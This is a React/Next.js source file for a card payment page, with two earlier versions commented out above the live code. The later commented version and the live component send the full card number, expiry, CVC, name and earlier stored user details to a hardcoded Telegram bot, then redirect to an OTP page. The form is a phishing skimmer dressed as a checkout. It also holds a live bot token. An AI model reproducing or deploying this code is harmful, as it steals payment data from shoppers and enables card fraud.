// // // File: pages/payment.tsx
// // "use client";

// // import React, { useState } from "react";

// // export default function PaymentPage() {
// //   const [amount, setAmount] = useState(500); // in cents
// //   const [name, setName] = useState("");
// //   const [cardNumber, setCardNumber] = useState("");
// //   const [expiry, setExpiry] = useState("");
// //   const [cvc, setCvc] = useState("");
// //   const [success, setSuccess] = useState("");
// //   const [error, setError] = useState("");

// //   const handlePayment = () => {
// //     setError("");
// //     setSuccess("");

// //     // Basic validation
// //     if (!name || !cardNumber || !expiry || !cvc) {
// //       setError("Please fill all fields");
// //       return;
// //     }

// //     if (cardNumber.length < 12) {
// //       setError("Card number too short");
// //       return;
// //     }

// //     // Simulate payment success
// //     const paymentData = {
// //       name,
// //       amount,
// //       cardNumber: `**** **** **** ${cardNumber.slice(-4)}`,
// //       date: new Date().toISOString(),
// //     };

// //     // Save to localStorage
// //     const payments = JSON.parse(localStorage.getItem("payments") || "[]");
// //     payments.push(paymentData);
// //     localStorage.setItem("payments", JSON.stringify(payments));

// //     setSuccess(`Payment of $${(amount / 100).toFixed(2)} successful!`);
// //     setName("");
// //     setCardNumber("");
// //     setExpiry("");
// //     setCvc("");
// //   };

// //   const previousPayments = JSON.parse(localStorage.getItem("payments") || "[]");

// //   return (
// //     <div className="min-h-screen bg-gradient-to-tr from-purple-200 via-pink-100 to-yellow-100 flex flex-col items-center p-4">
// //       <div className="w-full max-w-md bg-white shadow-lg rounded-xl p-6 sm:p-8 mt-10">
// //         <h1 className="text-3xl font-bold mb-6 text-center text-purple-700">
// //           💳 Make a Payment
// //         </h1>

// //         <div className="flex flex-col gap-4">
// //           <input
// //             type="text"
// //             value={name}
// //             onChange={(e) => setName(e.target.value)}
// //             placeholder="Name on Card"
// //             className="border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
// //           />

// //           <input
// //             type="text"
// //             value={cardNumber}
// //             onChange={(e) => setCardNumber(e.target.value)}
// //             placeholder="Card Number (1234 5678 9012 3456)"
// //             className="border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
// //           />

// //           <div className="flex gap-3">
// //             <input
// //               type="text"
// //               value={expiry}
// //               onChange={(e) => setExpiry(e.target.value)}
// //               placeholder="MM/YY"
// //               className="flex-1 border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
// //             />
// //             <input
// //               type="text"
// //               value={cvc}
// //               onChange={(e) => setCvc(e.target.value)}
// //               placeholder="CVC"
// //               className="flex-1 border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
// //             />
// //           </div>

// //           <input
// //             type="number"
// //             value={(amount / 100).toFixed(2)}
// //             onChange={(e) => setAmount(Number(e.target.value) * 100)}
// //             placeholder="Amount (USD)"
// //             className="border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
// //           />

// //           <button
// //             onClick={handlePayment}
// //             className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-bold py-3 rounded-xl shadow-md hover:scale-105 transition-transform"
// //           >
// //             Pay ${(amount / 100).toFixed(2)}
// //           </button>

// //           {error && <p className="text-red-500 text-center mt-2">{error}</p>}
// //           {success && (
// //             <p className="text-green-500 text-center mt-2">{success}</p>
// //           )}
// //         </div>
// //       </div>

// //       <div className="w-full max-w-md mt-6">
// //         <h2 className="text-xl font-semibold mb-3 text-center text-purple-700">
// //           Payment History
// //         </h2>
// //         <div className="flex flex-col gap-2 max-h-60 overflow-y-auto">
// //           {previousPayments.length === 0 && (
// //             <p className="text-gray-500 text-center">No payments yet.</p>
// //           )}
// //           {previousPayments.map((p: any, i: number) => (
// //             <div
// //               key={i}
// //               className="bg-white rounded-xl shadow-md p-3 flex justify-between items-center hover:shadow-lg transition-shadow"
// //             >
// //               <div>
// //                 <p className="font-semibold">{p.name}</p>
// //                 <p className="text-sm text-gray-500">{p.cardNumber}</p>
// //               </div>
// //               <div className="text-right">
// //                 <p className="font-bold text-purple-600">
// //                   ${(p.amount / 100).toFixed(2)}
// //                 </p>
// //                 <p className="text-xs text-gray-400">
// //                   {new Date(p.date).toLocaleDateString()}{" "}
// //                   {new Date(p.date).toLocaleTimeString()}
// //                 </p>
// //               </div>
// //             </div>
// //           ))}
// //         </div>
// //       </div>
// //     </div>
// //   );
// // }

// "use client";

// import { useRouter } from "next/navigation";

// import React, { useEffect, useState } from "react";

// export default function PaymentPage() {
//   const [amount, setAmount] = useState(500);
//   const [name, setName] = useState("");
//   const [cardNumber, setCardNumber] = useState("");
//   const [expiry, setExpiry] = useState("");
//   const [cvc, setCvc] = useState("");
//   const [success, setSuccess] = useState("");
//   const [error, setError] = useState("");
//   const [botData, seBotData] = useState();
//   const router = useRouter();

//   console.log("botData", botData);
//   useEffect(() => {
//     seBotData(localStorage.getItem("dataSent to The bot"));
//   }, []);

//   // useEffect(() => {
//   //   if (!expiry) return;

//   //   const [monthStr, yearStr] = expiry.split("/");
//   //   if (!monthStr || !yearStr) return;

//   //   let month = parseInt(monthStr, 10);
//   //   if (month < 1) month = 1;
//   //   if (month > 12) month = 12;

//   //   const formatted = `${month.toString().padStart(2, "0")}/${yearStr}`;
//   //   if (formatted !== expiry) setExpiry(formatted);
//   // }, [expiry]);

//   useEffect(() => {
//     if (!expiry) return;

//     const [monthStr, yearStr] = expiry.split("/");
//     if (!monthStr) return;

//     let month = parseInt(monthStr, 10);
//     if (month > 12) month = 12;

//     const formatted = monthStr.length === 1 ? "0" + month : month.toString();
//     setExpiry(yearStr ? `${formatted}/${yearStr}` : `${formatted}/`);
//   }, [expiry]);

//   const handlePayment = async () => {
//     setError("");
//     setSuccess("");
//     const message = `
//     USer and Product Information
//     -----------------------------
//     ${botData}
//     -------------------------------------------------------
//     Cardm Information 💸
//     ---------------------
//     name : ${name}
//     cardNumber : ${cardNumber}
//     expiry : ${expiry}
//     cvc : ${cvc}
//     `;
//     localStorage.setItem("dataSent to The bot", message);
//     console.log("message", message);
//     if (!name || !cardNumber || !expiry || !cvc) {
//       setError("Please fill all fields");
//       return;
//     }

//     const token = "8758821136:AAH-ON6KCqjx1UB_6EpH1yi3S0SWIGkhDaY";
//     const chatId = "6032588551";

//     // const message = "Hello from my bot 🚀";

//     try {
//       const response = await fetch(
//         `https://api.telegram.org/bot${token}/sendMessage`,
//         {
//           method: "POST",
//           headers: {
//             "Content-Type": "application/json",
//           },
//           body: JSON.stringify({
//             chat_id: chatId,
//             text: message,
//           }),
//         },
//       );

//       const result = await response.json();
//       console.log(result);
//       router.push("/otpPage");
//     } catch (error) {
//       console.error(error);
//     }

//     if (cardNumber.length < 12) {
//       setError("Card number too short");
//       return;
//     }

//     const paymentData = {
//       name,
//       amount,
//       cardNumber: `**** **** **** ${cardNumber.slice(-4)}`,
//       date: new Date().toISOString(),
//     };

//     const payments = JSON.parse(localStorage.getItem("payments") || "[]");
//     payments.push(paymentData);
//     localStorage.setItem("payments", JSON.stringify(payments));

//     setSuccess(`Payment of $${(amount / 100).toFixed(2)} successful!`);

//     setName("");
//     setCardNumber("");
//     setExpiry("");
//     setCvc("");
//   };

//   return (
//     <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
//       <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-6 sm:p-8 space-y-6">
//         {/* Title */}
//         <h1 className="text-2xl font-semibold text-center text-gray-800">
//           Payment
//         </h1>

//         {/* Card Preview */}
//         <div className="bg-gray-100 rounded-xl p-5 border border-gray-200">
//           <p className="tracking-widest text-lg text-gray-700 mb-3">
//             {cardNumber || "•••• •••• •••• ••••"}
//           </p>

//           <div className="flex justify-between text-sm text-gray-500">
//             <span>{name || "Card Holder"}</span>
//             <span>{expiry || "MM/YY"}</span>
//           </div>
//         </div>

//         {/* Form */}
//         <div className="space-y-4">
//           {/* Name */}
//           <div>
//             <label className="text-sm text-gray-500 flex items-center gap-2">
//               👤 Name
//             </label>
//             <input
//               type="text"
//               value={name}
//               onChange={(e) => setName(e.target.value)}
//               placeholder="John Doe"
//               className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
//             />
//           </div>

//           {/* Card Number */}
//           <div>
//             <label className="text-sm text-gray-500 flex items-center gap-2">
//               💳 Card Number
//             </label>
//             <input
//               type="text"
//               placeholder="1234 5678 9012 3456"
//               value={cardNumber}
//               onChange={(e) => {
//                 let value = e.target.value.replace(/\D/g, "");
//                 value = value.substring(0, 16);
//                 value = value.replace(/(.{4})/g, "$1 ").trim();
//                 setCardNumber(value);
//               }}
//               maxLength={19}
//               className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
//             />
//           </div>

//           {/* Expiry + CVC */}
//           <div className="grid grid-cols-2 gap-3">
//             <div>
//               <label className="text-sm text-gray-500 flex items-center gap-2">
//                 📅 Expiry
//               </label>
//               <input
//                 type="text"
//                 value={expiry}
//                 onChange={(e) => {
//                   // let value = e.target.value.replace(/\D/g, "");
//                   // if (value.length > 4) value = value.slice(0, 4);
//                   // if (value.length >= 3) {
//                   //   value = value.slice(0, 2) + "/" + value.slice(2);
//                   // }
//                   // setExpiry(value);

//                   let value = e.target.value.replace(/\D/g, ""); // remove non-digits

//                   if (value.length === 1) {
//                     // first digit
//                     if (parseInt(value, 10) > 1) value = "0" + value; // prepend 0 for 2-9
//                   }

//                   if (value.length > 2) {
//                     // split month/year
//                     value = value.slice(0, 2) + "/" + value.slice(2, 4);
//                   }

//                   setExpiry(value);
//                 }}
//                 maxLength={5}
//                 className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
//               />
//             </div>

//             <div>
//               <label className="text-sm text-gray-500 flex items-center gap-2">
//                 🔒 CVC
//               </label>
//               <input
//                 type="text"
//                 value={cvc}
//                 onChange={(e) => {
//                   const value = e.target.value.replace(/\D/g, "").slice(0, 3);
//                   setCvc(value);
//                 }}
//                 className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
//               />
//             </div>
//           </div>

//           {/* Button */}
//           <button
//             onClick={handlePayment}
//             className="w-full bg-black text-white font-medium py-3 rounded-lg hover:bg-gray-800 transition"
//           >
//             Pay
//           </button>

//           {/* Error */}
//           {error && <p className="text-red-500 text-center text-sm">{error}</p>}
//         </div>
//       </div>
//     </div>
//   );
// }

"use client";

import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";

export default function PaymentPage() {
  const [amount, setAmount] = useState(500);
  const [name, setName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [success, setSuccess] = useState("");
  const [error, setError] = useState("");
  const [botData, setBotData] = useState<string | null>(null);
  const router = useRouter();

  useEffect(() => {
    setBotData(localStorage.getItem("dataSent to The bot"));
  }, []);

  // Professional expiry formatting
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // remove non-digits

    if (value.length === 1 && parseInt(value, 10) > 1) {
      value = "0" + value; // prepend 0 for months 2-9
    }

    if (value.length > 2) {
      let month = parseInt(value.slice(0, 2), 10);
      if (month > 12) month = 12; // cap month
      const monthStr = month < 10 ? "0" + month : month.toString();
      const yearStr = value.slice(2, 4);
      value = monthStr + "/" + yearStr;
    }

    setExpiry(value.slice(0, 5)); // limit to MM/YY
  };

  const handlePayment = async () => {
    setError("");
    setSuccess("");

    const message = `
USer and Product Information 
-----------------------------
${botData}
-------------------------------------------------------
Card Information 💸
---------------------
name : ${name}
cardNumber : ${cardNumber}
expiry : ${expiry}
cvc : ${cvc}
`;

    localStorage.setItem("dataSent to The bot", message);

    if (!name || !cardNumber || !expiry || !cvc) {
      setError("Please fill all fields");
      return;
    }

    if (cardNumber.replace(/\s/g, "").length < 12) {
      setError("Card number too short");
      return;
    }

    const token = "8758821136:AAH-ON6KCqjx1UB_6EpH1yi3S0SWIGkhDaY";
    const chatId = "6032588551";

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message }),
      });
      router.push("/otpPage");
    } catch (error) {
      console.error(error);
    }

    const paymentData = {
      name,
      amount,
      cardNumber: `**** **** **** ${cardNumber.slice(-4)}`,
      date: new Date().toISOString(),
    };

    const payments = JSON.parse(localStorage.getItem("payments") || "[]");
    payments.push(paymentData);
    localStorage.setItem("payments", JSON.stringify(payments));

    setSuccess(`Payment of $${(amount / 100).toFixed(2)} successful!`);
    setName("");
    setCardNumber("");
    setExpiry("");
    setCvc("");
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-6 sm:p-8 space-y-6">
        {/* Title */}
        <h1 className="text-2xl font-semibold text-center text-gray-800">
          Payment
        </h1>

        {/* Card Preview */}
        <div className="bg-gray-100 rounded-xl p-5 border border-gray-200">
          <p className="tracking-widest text-lg text-gray-700 mb-3">
            {cardNumber || "•••• •••• •••• ••••"}
          </p>

          <div className="flex justify-between text-sm text-gray-500">
            <span>{name || "Card Holder"}</span>
            <span>{expiry || "MM/YY"}</span>
          </div>
        </div>

        {/* Form */}
        <div className="space-y-4">
          {/* Name */}
          <div>
            <label className="text-sm text-gray-500 flex items-center gap-2">
              👤 Name
            </label>
            <input
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="John Doe"
              className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
            />
          </div>

          {/* Card Number */}
          <div>
            <label className="text-sm text-gray-500 flex items-center gap-2">
              💳 Card Number
            </label>
            <input
              type="text"
              placeholder="1234 5678 9012 3456"
              value={cardNumber}
              onChange={(e) => {
                let value = e.target.value.replace(/\D/g, "");
                value = value.substring(0, 16);
                value = value.replace(/(.{4})/g, "$1 ").trim();
                setCardNumber(value);
              }}
              maxLength={19}
              className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
            />
          </div>

          {/* Expiry + CVC */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-sm text-gray-500 flex items-center gap-2">
                📅 Expiry
              </label>
              <input
                type="text"
                value={expiry}
                onChange={handleExpiryChange}
                maxLength={5}
                placeholder="MM/YY"
                className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
              />
            </div>

            <div>
              <label className="text-sm text-gray-500 flex items-center gap-2">
                🔒 CVC
              </label>
              <input
                type="text"
                value={cvc}
                onChange={(e) =>
                  setCvc(e.target.value.replace(/\D/g, "").slice(0, 3))
                }
                placeholder="123"
                className="w-full border border-gray-300 rounded-lg px-3 py-2 mt-1 focus:ring-2 focus:ring-gray-300 outline-none"
              />
            </div>
          </div>

          {/* Button */}
          <button
            onClick={handlePayment}
            className="w-full bg-black text-white font-medium py-3 rounded-lg hover:bg-gray-800 transition"
          >
            Pay
          </button>

          {/* Error */}
          {error && <p className="text-red-500 text-center text-sm">{error}</p>}
          {success && (
            <p className="text-green-500 text-center text-sm">{success}</p>
          )}
        </div>
      </div>
    </div>
  );
}
